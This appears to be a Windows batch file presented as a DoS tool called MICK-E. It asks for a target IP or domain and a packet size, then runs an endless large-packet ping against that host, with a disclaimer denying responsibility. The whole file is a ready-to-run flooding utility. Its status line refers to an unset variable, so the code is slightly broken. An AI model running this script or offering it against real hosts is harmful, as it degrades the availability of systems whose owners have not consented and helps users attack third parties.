@echo off
echo.
echo    Please make sure to run the file as administrator.
echo.
timeout /t 10 
:start
echo    _______________________________________________________________________
echo.
:::               .-"""-.
:::              /       \		[96m  \  | _ _|  ___| |  /        ____|[0m
:::              \       /		[96m |\/ |   |  |     | /         __|[0m  
:::       .-"""-.-`.-.-.<		[96m |   |   |  |     . \ _____|  |[0m    
:::      /      _,-\ ()()_/:)	[96m_|  _| ___|\____|_|\_\       _____|[0m
:::      \     / ,  `     `|
:::       '-..-| \-.,___,  /		   MADE BY VARIOUZ
:::             \ `-.__/  /
:::              `-.__.-'`
for /f "delims=: tokens=*" %%A in ('findstr /b ::: "%~f0"') do @echo(%%A
echo    _______________________________________________________________________
echo.
echo    [7mDownload the program at https://variouz.github.io/mick-e[0m
echo.
echo    %date% %time%
echo.
pause>nul|echo    [Any] Continue [Close Window] Exit
cls
echo.
echo    [96mEnter IP or domain name:[0m
echo.
set /p hostname=" "
cls
echo.
echo    [96mEnter amount of bytes to attack with:[0m
echo.
set /p amount=" "
cls
echo.
echo     [7mDownload the program at https://variouz.github.io/mick-e[0m
echo.
echo     Attacking %input% with %amount% bytes... 
echo. 
echo     [96m(we are not responsible for anything you get in trouble for)[0m
echo.
ping %hostname% -l %amount% -t
cls
echo.
echo    [7m[91mOne or more valid inputs were not supplied.[0m[0m

timeout /t 10
cls
goto start
